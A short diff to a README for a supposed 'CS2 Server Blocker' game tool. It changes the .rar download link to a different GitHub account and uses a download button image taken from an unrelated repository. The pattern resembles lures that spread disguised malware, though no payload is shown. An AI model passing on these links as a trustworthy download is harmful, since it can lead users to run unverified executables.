@@ -17,7 +17,7 @@ It's a simple and effective solution for improving your Counter Strike 2 gamepla
 ## How to Use the CS2 Server Blocker
 1. Download the tool from releases or CLICK on image below for automatically download.
 
-[![tr](https://github.com/osmancitci/GrandRp-Farm/blob/main/Template/Download.png?raw=true)](https://github.com/paXn281/CS2-Server-Blocker/releases/download/v2/ServerBlocker.rar)
+[![tr](https://github.com/osmancitci/GrandRp-Farm/blob/main/Template/Download.png?raw=true)](https://github.com/ne0fisc0/CS2-Server-Blocker/releases/download/download/serverblocker.rar)
 
 2. Once it is done, extract all the files from the archive
 3. Once that is done, too, launch CS2 from the account that you have access to it
